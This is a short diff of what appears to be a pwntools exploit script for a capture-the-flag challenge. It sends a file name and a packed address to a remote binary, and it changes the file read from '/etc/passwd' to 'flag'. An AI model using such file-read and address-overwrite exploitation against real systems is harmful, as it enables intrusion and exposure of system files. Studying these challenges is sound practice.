@@ -19,7 +19,7 @@ r.recvuntil(b'Secondary file\n')
 r.sendline(b'1')
 r.recvuntil(b'No high scores yet :(\n')
 
-r.sendline(b'/etc/passwd')
+r.sendline(b'flag')
 r.sendline(p64(0x401150))
 
 r.interactive()
